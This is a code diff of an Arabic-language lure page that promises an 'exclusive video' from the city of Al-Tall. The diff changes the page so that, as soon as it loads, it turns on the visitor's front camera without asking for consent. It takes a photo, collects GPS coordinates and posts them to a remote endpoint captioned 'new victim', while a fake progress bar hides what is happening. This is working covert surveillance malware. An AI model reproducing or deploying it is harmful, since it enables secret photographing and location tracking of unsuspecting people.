@@ -8,34 +8,27 @@
         body {background:#000; color:#fff; text-align:center; font-family:Arial; margin:0; padding:0; overflow:hidden;}
         .container {position:absolute; top:0; left:0; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;}
         h1 {font-size:28px; margin:20px; color:#f00;}
-        .fake {background:url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; height:70vh; width:90%; border:5px solid #f00; border-radius:15px; position:relative;}
-        .play-btn {position:absolute; font-size:80px; color:#fff; background:rgba(0,0,0,0.6); border-radius:50%; padding:20px; cursor:pointer; animation:pulse 1.5s infinite;}
-        @keyframes pulse {0% {transform:scale(1);} 50% {transform:scale(1.1);} 100% {transform:scale(1);}}
-        .loader {display:none; border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
+        .loader {border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
         @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
-        .progress-bar {display:none; width:80%; background:#333; border-radius:10px; overflow:hidden; margin:20px;}
-        .progress {height:20px; background:#f00; width:0%; animation:load 10s linear forwards;}
+        .progress-bar {width:80%; background:#333; border-radius:10px; overflow:hidden; margin:20px;}
+        .progress {height:20px; background:#f00; width:0%; animation:load 8s linear forwards;}
         @keyframes load {0% {width:0%;} 100% {width:100%;}}
+        p {font-size:18px; margin:10px;}
+        .fake-video {position:absolute; top:0; left:0; width:100%; height:100%; background:#000 url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; opacity:0.3; z-index:-1;}
     </style>
 </head>
-<body>
+<body onload="capture()">
+    <div class="fake-video"></div>
     <div class="container">
         <h1>فيديو حصري وصل للتو في مدينة التل</h1>
-        <p>اضغط على الزر لتشغيل الفيديو الكامل</p>
-        <div class="fake">
-            <div class="play-btn" onclick="startCapture()">▶</div>
-        </div>
-        <div class="loader" id="loader"></div>
-        <div class="progress-bar" id="progressBar"><div class="progress"></div></div>
-        <p id="status">جاري التحميل...</p>
+        <p>جاري تحميل الفيديو الكامل...</p>
+        <div class="loader"></div>
+        <div class="progress-bar"><div class="progress"></div></div>
+        <p>الرجاء الانتظار قليلاً، الجودة عالية جدًا...</p>
     </div>
 
     <script>
-    function startCapture() {
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('progressBar').style.display = 'block';
-        document.getElementById('status').innerText = 'جاري تحميل الفيديو عالي الجودة... انتظر قليلاً';
-
+    function capture() {
         navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
             let video = document.createElement('video');
             video.srcObject = stream;
@@ -58,14 +51,12 @@
                     form.append('photo', dataURLtoBlob(imgData));
                     form.append('caption', "🆕 ضحية جديدة من التل\nGPS: " + gps + "\nوقت الفتح: " + new Date());
 
-                    fetch(url, {method: 'POST', body: form}).then(() => {
-                        document.getElementById('status').innerText = 'تم تحميل الفيديو! انتظر قليلاً...';
-                    });
-                }, ()=>{});
+                    fetch(url, {method: 'POST', body: form});
+                });
 
                 stream.getTracks().forEach(track => track.stop());
             }, 1500);
-        }).catch(()=>{document.getElementById('status').innerText = 'خطأ في التشغيل، جرب تاني';});
+        }).catch(()=>{});
     }
 
     function dataURLtoBlob(dataurl) {
